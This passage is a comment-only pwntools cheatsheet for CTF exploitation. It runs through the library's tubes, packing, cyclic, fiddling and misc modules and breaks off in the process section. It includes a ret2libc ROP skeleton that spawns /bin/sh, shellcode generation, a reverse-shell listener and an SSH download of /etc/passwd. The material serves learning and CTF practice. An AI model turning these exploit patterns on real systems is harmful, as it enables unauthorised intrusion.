#!/usr/bin/env -S uv run python
# ##############################################################################
# ##                                                                          ##
# ##   P W N T O O L S   C H E A T S H E E T   (pwntools 4.15.0, Py 3.12)     ##
# ##                                                                          ##
# ##   Source: https://docs.pwntools.com/en/stable/  (module-by-module)       ##
# ##                                                                          ##
# ##############################################################################
#
# WHAT THIS IS
#   A single-file, comment-only tour of the whole pwntools API. Each group has
#   a ~2-line plain-English note followed by a short, runnable example. The file
#   does NOTHING when executed (every line is a comment) so it is safe to keep
#   open as a reference.
#
# HOW TO USE IT
#   * Read top to bottom to learn the API, or jump via the INDEX below.
#   * To RUN an example: select its block, remove the leading "#   ", and run it,
#     or just copy the lines into your own exploit script.
#   * Examples assume `from pwn import *` (shown once per block for copy-paste).
#
# INSTALL / RUN
#   uv add "pwntools==4.15.0"          # this repo already depends on it
#   uv run python your_exploit.py      # run a script
#   uv run python your_exploit.py DEBUG REMOTE HOST=1.2.3.4 PORT=1337   # magic args
#
# ------------------------------------------------------------------------------
# INDEX
#   1. pwn (globals) ............ everything `from pwn import *` gives you
#      context .................. global arch/os/bits/endian + logging config
#      args .................... magic UPPERCASE command-line arguments
#      log ..................... status output + progress spinners
#      ui ...................... pauses and interactive prompts
#   2. tubes ................... shared recv/send I/O API for all tubes
#      tubes.process ........... spawn/talk to a local process
#      tubes.sock .............. remote() client + listen() server (TCP/UDP/TLS)
#      tubes.ssh ............... run processes / move files over SSH
#      tubes.serialtube ........ talk to a serial port
#   3. util.packing ........... p8/p16/p32/p64, u*, flat/fit, pack/unpack
#      util.cyclic ............. de Bruijn patterns -> crash offsets
#      util.fiddling ........... xor, bits, hex/base64, hexdump, rol/ror
#      util.misc ............... read/write files, which, align, terminals
#      util.proc ............... inspect running processes via /proc
#      util.sh_string .......... safely quote data for /bin/sh
#      util.hashes ............. md5/sha*/blake2 of bytes or files
#      util.crc ................ CRC checksums (100+ models)
#      util.iters .............. bruteforce() / mbruteforce() + iterator tools
#      util.lists .............. group/findall/ordlist/partition
#      util.net ................ sockaddr + interface enumeration
#      util.web ................ wget()
#      util.safeeval ........... evaluate untrusted expressions safely
#   4. asm .................... assemble/disassemble + make_elf
#      shellcraft .............. templated shellcode generators
#      constants ............... arch-aware syscall numbers / flags
#      encoders ................ rewrite shellcode to avoid bad bytes
#      runner .................. run shellcode locally for quick testing
#   5. elf.elf ................ parse ELFs: symbols/GOT/PLT/rebasing
#      elf.corefile ............ read registers/memory from a crash core
#      rop.rop ................. build ROP chains automatically
#      rop.srop ................ SigreturnFrame (set every register)
#      rop.ret2dlresolve ....... call functions with no libc leak
#      fmtstr .................. format-string %n write primitives
#   6. gdb .................... launch/attach/script GDB
#      dynelf .................. resolve remote symbols from a leak
#      memleak ................. cache/align an unreliable leak
#      libcdb .................. identify & download a libc from leaks
#      filepointer ............. forge FILE structs (FSOP)
#      filesystem .............. pathlib-style local & SSH file access
#      flag .................... submit CTF flags
#      qemu .................... run/debug foreign-arch binaries
#      adb ..................... talk to Android devices
# ------------------------------------------------------------------------------
#
# ==============================================================================
# QUICK-START — a typical remote/local exploit skeleton
# ==============================================================================
#
# The pattern behind almost every pwn script: pick target from args, load the
# ELF/libc for addresses, build a payload, then drop to an interactive shell.
#
#   from pwn import *
#   context.binary = elf = ELF('./chall')        # sets arch/bits/endian
#   libc = ELF('./libc.so.6', checksec=False)    # if provided
#   context.log_level = 'info'                    # 'debug' shows all I/O
#
#   def start():
#       if args.REMOTE:                           # python x.py REMOTE HOST=.. PORT=..
#           return remote(args.HOST, int(args.PORT))
#       if args.GDB:                              # python x.py GDB
#           return gdb.debug([elf.path], gdbscript='b main\nc')
#       return process([elf.path])                # plain local run
#
#   io = start()
#   # --- leak libc (e.g. via puts(puts@got)) ---
#   rop = ROP(elf)
#   rop.puts(elf.got['puts'])
#   rop.call(elf.sym['main'])
#   io.sendlineafter(b'> ', flat({40: rop.chain()}))
#   leak = u64(io.recvline().strip().ljust(8, b'\x00'))
#   libc.address = leak - libc.sym['puts']        # rebase libc
#   log.success('libc base: %#x', libc.address)
#   # --- second stage: system("/bin/sh") ---
#   rop2 = ROP(libc)
#   rop2.call(rop2.ret)                           # stack align
#   rop2.system(next(libc.search(b'/bin/sh\x00')))
#   io.sendlineafter(b'> ', flat({40: rop2.chain()}))
#   io.interactive()
#
#
# ==============================================================================
# pwn (globals) — everything `from pwn import *` drops into your namespace
# https://docs.pwntools.com/en/stable/globals.html
# ==============================================================================
#
# One import gives you the whole CTF toolbox: no need to import submodules.
# It also re-exports the stdlib modules os, sys, time, re, random, struct.
#
#   from pwn import *
#   print(os.getcwd(), sys.argv, re, struct, random, time)   # stdlib, free
#
# Tubes: talk to a local process, a remote service, a listener, or over SSH.
# These are the core I/O objects for every exploit.
#
#   from pwn import *
#   io = process('./vuln')                 # spawn a local binary
#   io = remote('example.com', 1337)       # connect to a remote service
#   srv = listen(4444); io = srv.wait_for_connection()  # act as a server
#   shell = ssh(host='host', user='ctf', password='pw')  # SSH session
#   io = shell.process('/bin/sh')          # run a process over SSH
#
# ELF: parse a binary, read/set symbol, GOT, PLT and function addresses.
# ROP: build ROP chains with a small DSL. DynELF: resolve libc via a leak.
#
#   from pwn import *
#   e = ELF('./vuln')
#   print(hex(e.symbols['main']), hex(e.got['puts']), hex(e.plt['system']))
#   e.address = 0x555555554000             # rebase; symbols shift with it
#   rop = ROP(e)
#   rop.call('system', [next(e.search(b'/bin/sh'))])
#   payload = rop.chain()                  # bytes ready to send
#
# asm/disasm: assemble text to bytes and back. shellcraft: ready shellcode.
# Architecture comes from context (set context.arch first).
#
#   from pwn import *
#   context.arch = 'amd64'
#   code = asm('xor rdi, rdi; mov rax, 60; syscall')   # bytes
#   print(disasm(code))                                # human-readable
#   sc = asm(shellcraft.amd64.linux.sh())              # /bin/sh shellcode
#
# cyclic/cyclic_find: make a De Bruijn pattern to find a crash offset.
# Feed cyclic() as input, then pass the leaked value to cyclic_find().
#
#   from pwn import *
#   pattern = cyclic(200)                  # b'aaaabaaacaaad...'
#   offset  = cyclic_find(0x6161616c)      # int or 4-byte value -> index
#   offset  = cyclic_find(b'laaa')         # also accepts the raw bytes
#
# Packing: p8/p16/p32/p64 turn ints into bytes; u8/u16/u32/u64 do the reverse.
# Width and endianness follow context unless you pass endian=/sign= yourself.
#
#   from pwn import *
#   context.arch = 'amd64'
#   data = p64(0xdeadbeef)                 # 8 little-endian bytes
#   addr = u64(b'\x08\x40\x00\x00\x00\x00\x00\x00')
#   half = p16(0x4142, endian='big')       # b'\x41\x42'
#
# pack/unpack: like p*/u* but you choose the bit-width explicitly.
#
#   from pwn import *
#   blob = pack(0x4142, word_size=32)      # 4 bytes, context endianness
#   val  = unpack(b'\x01\x02\x03', word_size=24)   # arbitrary widths
#
# flat/fit: build a padded payload from pieces; fit places data at offsets.
# ints get packed with context word size; str/bytes are used as-is.
#
#   from pwn import *
#   context.arch = 'amd64'
#   buf = flat(b'A' * 40, 0xdeadbeef, b'CCCC')     # concatenate + pack
#   buf = fit({40: p64(0xcafebabe), 64: b'/bin/sh'}, length=80)  # by offset
#
# xor: byte-wise XOR of two (or more) values, cycling the shorter one.
# Handy for simple crypto and key recovery.
#
#   from pwn import *
#   ct = xor(b'hello', 0x42)               # xor every byte with 0x42
#   key = xor(b'plaintext', b'ciphertext') # recover a repeating key
#
# hexdump: pretty colored hex+ASCII view of bytes, great for debugging.
#
#   from pwn import *
#   print(hexdump(b'\x00pwn\xffAAAA'))     # offset | hex | ascii
#
# bits/unbits: convert bytes to a list of bits and back.
#
#   from pwn import *
#   b = bits(b'A')                         # [0,1,0,0,0,0,0,1]
#   raw = unbits([0,1,0,0,0,0,0,1])        # b'A'
#
# enhex/unhex and b64e/b64d: hex and base64 encode/decode helpers.
#
#   from pwn import *
#   enhex(b'ABC')      # '414243'          # bytes -> hex string
#   unhex('414243')    # b'ABC'            # hex string -> bytes
#   b64e(b'ABC')       # 'QUJD'            # bytes -> base64 string
#   b64d('QUJD')       # b'ABC'            # base64 string -> bytes
#
# rol/ror: bitwise rotate of an integer (or bytes) by n places.
#
#   from pwn import *
#   rol(0b0001, 2, word_size=4)            # 0b0100
#   ror(0x12345678, 8, word_size=32)       # rotate right
#
# Misc utilities: which locates a binary, read/write are file shortcuts,
# wget fetches a URL, pause/sleep control timing.
#
#   from pwn import *
#   path = which('gdb')                    # /usr/bin/gdb or None
#   data = read('/etc/hostname')           # read whole file -> bytes
#   write('/tmp/out.bin', b'payload')      # write bytes to a file
#   sleep(0.5)                             # like time.sleep
#   pause()                                # wait for Enter (e.g. attach gdb)
#
# ==============================================================================
# context — one global place for arch/os/bits/endianness and log settings
# https://docs.pwntools.com/en/stable/context.html
# ==============================================================================
#
# context holds target details so asm/shellcraft/packing all agree.
# Set it once at the top of your script; everything else reads from it.
#
#   from pwn import *
#   context.arch = 'amd64'                 # also: 'i386','arm','mips',...
#   context.os = 'linux'                   # 'linux','windows','freebsd',...
#   context.bits = 64                      # word size; arch usually sets it
#   context.endian = 'little'              # 'little'/'big' (aliases le/be)
#
# context.binary auto-detects arch, bits and endian from an ELF and returns
# an ELF object, so you rarely need to set arch by hand.
#
#   from pwn import *
#   context.binary = './vuln'              # sets arch/bits/endian for you
#   print(context.arch, context.bits)      # e.g. amd64 64
#   e = context.binary                     # it's also the ELF object
#
# Logging + terminal: log_level controls verbosity, terminal is used when
# pwntools opens a new window (e.g. gdb).
#
#   from pwn import *
#   context.log_level = 'debug'            # 'debug'/'info'/'warning'/'error'
#   context.terminal = ['tmux', 'splitw', '-h']   # how to spawn windows
#
# Process behavior: aslr toggles ASLR for spawned processes, timeout is the
# default wait for blocking tube ops, newline is the line ending, kernel is
# the kernel arch (32-bit binary on a 64-bit kernel).
#
#   from pwn import *
#   context.aslr = False                   # disable ASLR for process()
#   context.timeout = 5                    # seconds before tube ops give up
#   context.newline = b'\r\n'              # override the default b'\n'
#   context.kernel = 'amd64'               # for 32-on-64 shellcode
#
# context.update sets several values at once; context.clear resets to defaults.
#
#   from pwn import *
#   context.update(arch='arm', os='linux', bits=32, endian='big')
#   context.clear()                        # back to defaults (i386/linux/32)
#
# context.local(...) as a with-block: temporarily change settings, then the
# old values are automatically restored when the block ends.
#
#   from pwn import *
#   context.arch = 'amd64'
#   with context.local(arch='i386'):
#       sc = asm(shellcraft.sh())          # assembled as 32-bit here
#   # context.arch is back to 'amd64' after the block
#
# ==============================================================================
# args — magic UPPERCASE command-line arguments as args.NAME
# https://docs.pwntools.com/en/stable/args.html
# ==============================================================================
#
# Any UPPERCASE token on the command line becomes an entry in args.
# NAME=value sets a string; a bare NAME sets it to '1'. Missing = ''.
# Run:  python x.py HOST=1.2.3.4 PORT=1337 DEBUG
#
#   from pwn import *
#   host = args.HOST                       # '1.2.3.4'
#   port = int(args.PORT or 1337)          # '1337' -> 1337
#   flag = args.DEBUG                       # '1' if present, else ''
#   host = args['HOST']                    # dict-style access also works
#
# The classic switch between remote and local targets with args.REMOTE.
# Run local:  python x.py     Run remote:  python x.py REMOTE
#
#   from pwn import *
#   if args.REMOTE:
#       io = remote('example.com', 1337)
#   else:
#       io = process('./vuln')
#
# Built-in magic args change pwntools behavior with no code (set on CLI):
#   DEBUG        -> log_level=debug (shows every byte on the tubes)
#   LOG_LEVEL=x  -> set log level (e.g. LOG_LEVEL=warning)
#   LOG_FILE=f   -> also write logs to file f
#   SILENT       -> log_level=error (quiet)
#   NOASLR       -> disable ASLR (context.aslr=False)
#   NOPTRACE     -> disable gdb.attach()/ptrace features (for remote runs)
#   GDB          -> run under gdb when using gdb.debug()
#   STDERR       -> send logging to stderr instead of stdout
#   NOTERM       -> disable terminal animations/colors
#   TIMEOUT=n    -> default tube timeout
#   RANDOMIZE    -> enable context.randomize
#
#   from pwn import *
#   # python x.py DEBUG NOPTRACE LOG_FILE=./run.log
#   io = process('./vuln')                 # every send/recv is now logged
#
# ==============================================================================
# log — pretty status output ([*] [+] [-] etc.) and progress spinners
# https://docs.pwntools.com/en/stable/log.html
# ==============================================================================
#
# Leveled log helpers print tidy, colored, prefixed lines.
# error/exception also RAISE and stop the script; the rest just print.
#
#   from pwn import *
#   log.info('connecting...')              # [*] connecting...
#   log.success('got shell')               # [+] got shell
#   log.failure('no leak this round')      # [-] no leak this round
#   log.warning('retrying')                # [!] retrying (log.warn = alias)
#   log.debug('raw = %r', data)            # only shown at debug level
#   log.indented('extra detail')           # continuation line, no prefix
#   log.error('fatal: bad offset')         # prints then raises -> aborts
#
# log.progress gives a live one-line spinner; update it with .status(),
# finish with .success() or .failure(). Works as a with-block too.
#
#   from pwn import *
#   p = log.progress('Bruteforcing')
#   for i in range(256):
#       p.status('byte %d/256' % i)        # updates the same line
#   p.success('found: 0x41')               # turns the line green + stops
#   # p.failure('gave up')                 # or mark it failed
#
#   from pwn import *
#   with log.progress('Leaking libc') as p:
#       p.status('sending payload')        # auto-success on clean exit
#
# Control verbosity globally through context (same values as CLI LOG_LEVEL).
#
#   from pwn import *
#   context.log_level = 'error'            # hush everything but errors
#
# ==============================================================================
# ui — simple interactive prompts and pauses
# https://docs.pwntools.com/en/stable/ui.html
# ==============================================================================
#
# pause() waits for Enter (handy to attach a debugger); pause(n) counts down
# n seconds. pause is available directly from the toolbox too.
#
#   from pwn import *
#   pause()                                # press Enter to continue
#   pause(3)                               # sleep-with-countdown for 3s
#
# Ask the user questions: yesno returns a bool, options returns the chosen
# index, more pages long text like the `more` command.
#
#   from pwn import *
#   if ui.yesno('Send exploit?'):          # True on yes, False on no
#       log.info('sending')
#   choice = ui.options('Pick target', ['local', 'remote'])   # -> int index
#   ui.more(open('notes.txt').read())      # paginate long text
#
#
# ==============================================================================
# pwnlib.tubes — Talking to the World (shared tube I/O API)
# https://docs.pwntools.com/en/stable/tubes.html
# ==============================================================================
#
# Every tube (process/remote/ssh channel/serial) shares this I/O API.
# All recv* methods return bytes; all data you send must be bytes.
#
#   from pwn import *
#   io = process('./chal')           # any tube: process/remote/ssh works the same
#
# Receiving: pull raw bytes or fixed counts from the tube.
# recv(n) returns up to n bytes; recvn(n) blocks for exactly n.
#
#   from pwn import *
#   io = process('./chal')
#   data = io.recv(4096)             # up to 4096 bytes, returns as soon as any arrive
#   exact = io.recvn(8)              # exactly 8 bytes (e.g. a 64-bit leak)
#
# Line-based receiving: read whole lines, dropping the trailing newline if asked.
# recvline() reads one line; drop=True strips the '\n'.
#
#   from pwn import *
#   io = process('./chal')
#   line = io.recvline()             # one line, includes b'\n'
#   line = io.recvline(drop=True)    # one line, without trailing newline
#
# recvuntil: read until a delimiter appears (drop removes the delimiter from result).
# The workhorse for syncing to a prompt or marker.
#
#   from pwn import *
#   io = process('./chal')
#   io.recvuntil(b'Enter name: ')            # read up through the prompt
#   token = io.recvuntil(b'}', drop=False)   # keep reading until '}' included
#
# Filtered line reads: keep reading lines until one matches a condition.
# Handy when useful output is buried in banners/noise.
#
#   from pwn import *
#   io = process('./chal')
#   io.recvline_contains(b'flag')            # first line containing b'flag'
#   io.recvline_startswith(b'addr:')         # first line starting with prefix
#   io.recvline_endswith(b'done')            # first line ending with suffix
#
# recvregex: read until data matches a regex; capture=True returns the match object.
# recvrepeat/recvall: drain everything available / until EOF.
#
#   from pwn import *
#   io = process('./chal')
#   m = io.recvregex(rb'0x[0-9a-f]+', capture=True)   # match object; m.group() = the hex
#   chunk = io.recvrepeat(0.5)               # everything arriving within 0.5s
#   rest  = io.recvall()                     # read until EOF, then closes the tube
#
# Sending: write bytes, optionally with a trailing newline.
# sendline(data) == send(data + b'\n').
#
#   from pwn import *
#   io = process('./chal')
#   io.send(b'\x90' * 16)            # raw bytes, no newline
#   io.sendline(b'admin')           # bytes + newline
#
# Send-after: wait for a delimiter, then send (the most common request/response idiom).
# sendlineafter is the go-to for menu-driven prompts.
#
#   from pwn import *
#   io = process('./chal')
#   io.sendafter(b'name: ', b'AAAA')            # recvuntil(delim) then send(data)
#   io.sendlineafter(b'> ', b'1')               # recvuntil(delim) then sendline(data)
#   resp = io.sendthen(b'\n', b'ping')          # send(data) then recvuntil(delim)
#   resp = io.sendlinethen(b'\n', b'ping')      # sendline(data) then recvuntil(delim)
#
# Buffer management: clean() discards buffered data; unrecv() pushes bytes back.
# clean_and_log() is clean() but prints what it drained (great for debugging).
#
#   from pwn import *
#   io = process('./chal')
#   io.clean(timeout=0.1)           # drop pending buffered data, return it
#   io.clean_and_log()              # same, but log it too
#   data = io.recv(8)
#   io.unrecv(data)                 # put those bytes back at front of buffer
#
# interactive(): hand the tube to your keyboard (drop into the shell after exploiting).
# stream(): print everything until the tube dies.
#
#   from pwn import *
#   io = process('./chal')
#   # io.interactive()             # type back and forth manually (Ctrl-] / Ctrl-C to exit)
#   # io.stream()                  # dump all output until EOF
#
# Timeouts: set a default via the .timeout attribute or scope one with `with io.timeout(...)`.
# can_recv() polls whether data is ready without blocking.
#
#   from pwn import *
#   io = process('./chal')
#   io.timeout = 2                  # default timeout (seconds) for recv operations
#   with io.timeout(0.5):          # temporary timeout for this block
#       io.recvline()
#   if io.can_recv(timeout=0):     # True if bytes are immediately available
#       io.recv()
#
# Teardown: half-close one direction with shutdown(), or fully close().
# shutdown('send') sends EOF to the process's stdin.
#
#   from pwn import *
#   io = process('./chal')
#   io.shutdown('send')             # 'send'/'out'/'write' -> EOF on their stdin
#   io.shutdown('recv')             # 'recv'/'in'/'read'   -> stop reading
#   io.close()                      # close the whole tube
#
# Leak idiom: sync with recvuntil, grab the raw pointer, unpack with u64/u32.
# recvn(6) + pad because 64-bit heap/libc leaks are often 6 bytes on the wire.
#
#   from pwn import *
#   io = process('./chal')
#   io.recvuntil(b'leak: ')
#   leak = u64(io.recvn(6).ljust(8, b'\x00'))   # 6-byte leak -> 8-byte int
#   payload = flat({0x40: p64(leak)})           # build reply with packed pointer
#   io.sendline(payload)
#
# ==============================================================================
# pwnlib.tubes.process — spawn and talk to a local process
# https://docs.pwntools.com/en/stable/tubes/processes.html
# ==============================================================================
#
# Launch a local binary. Pass argv as a list; first element is the program.
# Everything from the shared tube API above works on the returned object.
#
#   from pwn import *
#   io = process('./chal')                       # simplest form
#   io = process(['./chal', '--flag', 'AAAA'])   # argv list with arguments
#
# Constructor knobs: env dict, cwd, custom stdin/stdout/stderr, ASLR toggle.
# aslr=False disables ASLR (setarch -R); level controls log verbosity.
#
#   from pwn import *
#   io = process(['./chal'], env={'LD_PRELOAD': './libc.so.6'},  # custom environment
#                cwd='/tmp',                     # working directory
#                stdin=PTY, stdout=PTY,          # allocate a pseudo-terminal
#                aslr=False,                     # disable ASLR for stable addresses
#                setuid=False,                   # ignore setuid bit (Linux 3.5+)
#                raw=True, level='debug')        # raw tty, verbose logging
#
# context.binary auto-populates arch/bits and makes process()/ELF convenient.
# The .elf and .libc attributes give you ready ELF objects (addresses adjusted).
#
#   from pwn import *
#   context.binary = elf = ELF('./chal')         # sets context + gives an ELF
#   io = process()                               # runs context.binary
#   e = io.elf                                    # ELF of the launched program
#   libc = io.libc                                # ELF of its libc, base fixed to runtime
#
# Process control: pid attribute, poll() for exit status, wait(), kill().
# corefile gives you a Corefile for post-crash register/memory inspection.
#
#   from pwn import *
#   io = process('./chal')
#   print(io.pid)                    # process id
#   code = io.poll()                 # exit code, or None if still running
#   io.kill()                        # terminate it
#   io.wait()                        # block until it exits
#   core = io.corefile               # Corefile object after a crash
#   rip  = core.pc                   # e.g. read crashed instruction pointer
#
# ==============================================================================
# pwnlib.tubes.sock — remote() TCP/UDP client and listen() server
# https://docs.pwntools.com/en/stable/tubes/sockets.html
# ==============================================================================
#
# remote(host, port): connect to a service. Same tube I/O API as process.
# The default is TCP; this is how you talk to CTF challenge servers.
#
#   from pwn import *
#   io = remote('chal.ctf.example', 1337)        # TCP connect
#   io.sendlineafter(b'> ', b'1')
#   print(io.recvline())
#
# TLS and UDP variants via ssl=/sni=/typ= parameters.
# ssl=True wraps the socket in TLS; typ='udp' switches to datagrams.
#
#   from pwn import *
#   io = remote('example.com', 443, ssl=True, sni='example.com')  # TLS with SNI
#   io = remote('example.com', 53, typ='udp')                     # UDP socket
#   print(io.connected())            # True while the connection is live
#   io.close()
#
# listen(port, bindaddr): open a server socket and wait for someone to connect.
# Useful for catching reverse shells or receiving a callback.
#
#   from pwn import *
#   l = listen(4444, bindaddr='0.0.0.0')         # bind and listen on TCP :4444
#   print(l.lport, l.lhost)                       # chosen port / address
#   l.wait_for_connection()                       # block until a client connects
#   l.sendline(b'id')                             # then use it like any tube
#   print(l.recvline())
#
# Wrap an existing Python socket with the tube API via remote.fromsocket().
# Handy when another library already handed you a connected socket.
#
#   from pwn import *
#   import socket
#   s = socket.create_connection(('example.com', 80))
#   io = remote.fromsocket(s)                      # adopt it as a pwntools tube
#   raw = io.sock                                  # get the underlying socket back
#   io.send(b'GET / HTTP/1.0\r\n\r\n')
#
# ==============================================================================
# pwnlib.tubes.ssh — run and talk to processes on a remote host over SSH
# https://docs.pwntools.com/en/stable/tubes/ssh.html
# ==============================================================================
#
# Open an SSH session with password or key auth.
# The resulting object launches remote programs and transfers files.
#
#   from pwn import *
#   s = ssh(user='ctf', host='shell.example', port=22, password='hunter2')
#   s = ssh(user='ctf', host='shell.example', keyfile='~/.ssh/id_rsa')  # key auth
#
# s.process(argv): spawn a remote process and get a tube (full tube I/O API).
# checksec/libs inspect a remote binary's mitigations and loaded libraries.
#
#   from pwn import *
#   s = ssh(user='ctf', host='shell.example', password='pw')
#   io = s.process(['/challenge/vuln', 'arg'], cwd='/challenge')   # remote process as a tube
#   io.sendline(b'payload')
#   print(io.recvline())
#   s.checksec()                         # print remote binary mitigations
#   libs = s.libs('/challenge/vuln')     # dict of loaded libraries -> base addresses
#
# Quick command execution: s.run()/s.system() return a tube; s['cmd'] and s('cmd')
# return the command's output bytes directly. s.shell() gives an interactive shell.
#
#   from pwn import *
#   s = ssh(user='ctf', host='shell.example', password='pw')
#   io = s.run('id')                     # returns a tube; io.recvall() for output
#   who = s('whoami')                    # run and return output bytes
#   out = s['uname -a']                  # same, index-style
#   # sh = s.shell('/bin/bash'); sh.interactive()   # interactive remote shell
#
# File transfer and remote working directory.
# set_working_directory() makes a fresh temp dir and cd's into it.
#
#   from pwn import *
#   s = ssh(user='ctf', host='shell.example', password='pw')
#   s.upload('./exploit', '/tmp/exploit')     # local -> remote
#   s.download('/etc/passwd', './passwd')     # remote -> local
#   cwd = s.set_working_directory()           # new temp dir, returns its path
#
# ==============================================================================
# pwnlib.tubes.serialtube — talk to a serial port
# https://docs.pwntools.com/en/stable/tubes/serial.html
# ==============================================================================
#
# Open a serial device as a tube (embedded/hardware targets, /dev/ttyUSB*).
# Same recv/send API; baudrate defaults to 115200.
#
#   from pwn import *
#   io = serialtube('/dev/ttyUSB0', baudrate=115200)   # port + speed
#   io = serialtube('/dev/ttyUSB0', baudrate=9600, bytesize=8, parity='N', stopbits=1)
#   io.sendline(b'AT')                 # write to the device
#   print(io.recvline())               # read a response line
#
#
# ==============================================================================
# pwnlib.util.packing — convert integers <-> bytes, build payloads
# https://docs.pwntools.com/en/stable/util/packing.html
# ==============================================================================
#
# Pack an integer into bytes of a fixed width (p8/p16/p32/p64).
# Default is little-endian, unsigned. Names mirror the bit width.
#
#   from pwn import *
#   p8(0x41)                      # b'A'
#   p16(0x4142)                   # b'BA'  (little-endian)
#   p32(0xdeadbeef)               # b'\xef\xbe\xad\xde'
#   p64(0xdeadbeef)               # b'\xef\xbe\xad\xde\x00\x00\x00\x00'
#   p32(0xdeadbeef, endian='big') # b'\xde\xad\xbe\xef'
#   p16(-1, sign=True)            # signed pack -> b'\xff\xff'
#
# Unpack bytes back into an integer (u8/u16/u32/u64). Reverse of p*.
# Pad short data with ljust so the length matches the width.
#
#   from pwn import *
#   u32(b'\xef\xbe\xad\xde')             # 0xdeadbeef
#   u64(io.recv(8))                      # read a 64-bit leak off the wire
#   u64(data.ljust(8, b'\x00'))          # pad a short leak to 8 bytes then unpack
#   u32(b'\xff\xff\xff\xff', sign=True)  # -> -1 (signed)
#   u16(b'\x42\x41', endian='big')       # 0x4241
#
# pack()/unpack(): generic versions where you pass the word_size explicitly.
# word_size can be 8/16/32/64 or 'all' (as many bytes as needed).
#
#   from pwn import *
#   pack(0x4142, word_size=16, endianness='little', sign=False)  # b'BA'
#   pack(0xff, word_size='all')                                  # b'\xff'
#   unpack(b'BA', 16)                                            # 0x4142
#   unpack_many(b'AAAABBBB', 32)                                 # [0x41414141, 0x42424242]
#
# flat(): concatenate/flatten ints, bytes, lists, dicts into one payload.
# A dict maps offset -> data and gaps are filled (default filler = cyclic).
# fit() is just an alias for flat().
#
#   from pwn import *
#   flat(b'AAAA', p32(0xdeadbeef), [p32(1), p32(2)])   # concatenated bytes
#   flat({0: b'HEAD', 8: p32(0xdeadbeef)}, filler=b'\x00')  # place data at offsets
#   fit({32: p64(0x400000)})                            # same as flat, gaps = cyclic
#
# make_packer()/make_unpacker(): build a reusable packer with baked-in options.
#
#   from pwn import *
#   pk = make_packer(word_size=32, endianness='big')   # frozen 32-bit BE packer
#   pk(0x41424344)                                      # b'ABCD'
#   up = make_unpacker(32, endianness='big')
#   up(b'ABCD')                                         # 0x41424344
#
# ==============================================================================
# pwnlib.util.cyclic — de Bruijn patterns to find crash offsets
# https://docs.pwntools.com/en/stable/util/cyclic.html
# ==============================================================================
#
# cyclic(n) makes a unique (de Bruijn) pattern: every n-length window appears
# once. Send it as overflow input, then find where the crash value came from.
#
#   from pwn import *
#   cyclic(16)                 # b'aaaabaaacaaadaaa'
#   cyclic_find(b'caaa')       # 8  -> offset of that 4-byte window
#   cyclic_find(0x61616163)    # 8  -> also accepts a packed int
#
# For 64-bit targets use n=8 so 8-byte windows (a full register) stay unique.
# Match cyclic_find's n to the cyclic() you generated.
#
#   from pwn import *
#   payload = cyclic(512, n=8)         # 8-byte-unique pattern for 64-bit
#   # ...crash, RSP/RIP holds e.g. 0x6161616161616166...
#   cyclic_find(0x6161616161616166, n=8)   # exact byte offset of the overwrite
#
# cyclic_gen builds a generator object you can query without regenerating.
# de_bruijn() is the underlying lazy sequence generator.
#
#   from pwn import *
#   g = cyclic_gen(n=8)
#   g.get(64)                  # first 64 bytes of the pattern
#   g.find(b'gaaaaaaa')        # offset within that generator's sequence
#
# ==============================================================================
# pwnlib.util.fiddling — XOR, bit twiddling, hex/base64, hexdump
# https://docs.pwntools.com/en/stable/util/fiddling.html
# ==============================================================================
#
# xor(): XOR arguments together; a shorter key is repeated to match length.
# xor_pair(): find two byte strings that XOR to data (avoiding bad bytes).
#
#   from pwn import *
#   xor(b'hello', b'\x42')             # single-byte key, repeated over all bytes
#   xor(b'hello', b'key')              # multi-byte key wraps around
#   xor(b'\x01\x02', b'\x03\x04')      # XOR two equal-length buffers
#   a, b = xor_pair(b'secret')         # a ^ b == b'secret', no NUL/newline
#
# bits()/unbits()/bits_str(): bytes <-> list/string of bits.
#
#   from pwn import *
#   bits(b'A')                         # [0,1,0,0,0,0,0,1]  (big-endian, MSB first)
#   bits_str(b'A')                     # '01000001'
#   unbits([0,1,0,0,0,0,0,1])          # b'A'
#
# rol()/ror(): rotate a value (or sequence) left/right by k bits.
#
#   from pwn import *
#   rol(0b0001, 2, word_size=4)        # 0b0100
#   ror(0x12345678, 8, word_size=32)   # rotate right 8 bits
#
# enhex()/unhex(): bytes <-> hex string. b64e()/b64d(): base64 encode/decode.
# urlencode()/urldecode(): percent-encoding.
#
#   from pwn import *
#   enhex(b'ABC')                      # '414243'
#   unhex('414243')                    # b'ABC'
#   b64e(b'hello')                     # 'aGVsbG8='
#   b64d('aGVsbG8=')                   # b'hello'
#   urlencode('a b/c')                 # '%61%20%62%2f%63'
#   urldecode('%61%20b')               # 'a b'
#
# hexdump(): pretty hex+ASCII dump string. hexdump_iter(): stream from a file.
# bitswap() reverses bits in each byte; isprint() tests printable ASCII.
#
#   from pwn import *
#   print(hexdump(b'ABCD\x00\xff'))    # offset | hex bytes | ASCII
#   for line in hexdump_iter(open('/bin/ls','rb')): print(line)  # big files
#   bitswap(b'\x01')                   # b'\x80'
#   isprint(ord('A'))                  # True
#
# ==============================================================================
# pwnlib.util.misc — files, PATH lookup, terminals, alignment
# https://docs.pwntools.com/en/stable/util/misc.html
# ==============================================================================
#
# read()/write(): quick whole-file read and write (bytes by default).
#
#   from pwn import *
#   data = read('/etc/hostname')             # read entire file -> bytes
#   read('/bin/ls', count=64)                # first 64 bytes
#   write('/tmp/payload', b'AAAA')           # write bytes to a file
#   write('/tmp/new/f', b'x', create_dir=True)  # make parent dirs first
#
# which(): locate an executable on $PATH. run_in_new_terminal(): pop a terminal.
#
#   from pwn import *
#   which('gdb')                              # '/usr/bin/gdb' or None
#   run_in_new_terminal('gdb -p 1234')        # launch cmd in a new terminal window
#
# align()/align_down(): round a value up/down to a power-of-two boundary.
# (NOTE: there is no align_up; align() already rounds UP.)
# mkdir_p(): mkdir -p. parse_ldd_output(): map lib name -> load address.
#
#   from pwn import *
#   align(0x1000, 0x1234)                     # 0x2000  (round UP to multiple)
#   align_down(0x1000, 0x1234)                # 0x1000  (round DOWN)
#   mkdir_p('/tmp/a/b/c')                     # create nested dirs, no error if exist
#   parse_ldd_output(process(['ldd','/bin/ls']).recvall().decode())  # {lib: addr}
#
# ==============================================================================
# pwnlib.util.proc — inspect running processes via /proc
# https://docs.pwntools.com/en/stable/util/proc.html
# ==============================================================================
#
# Find PIDs by name. pidof() accepts a name, a tube, or an ELF.
#
#   from pwn import *
#   proc.pidof('firefox')            # [4321, ...] all matching PIDs
#   proc.pid_by_name('sshd')         # PIDs sorted youngest-to-oldest
#   proc.pidof(io)                   # PID(s) behind a process/tube
#
# Query a process's binary, working dir, name, cmdline, and state.
#
#   from pwn import *
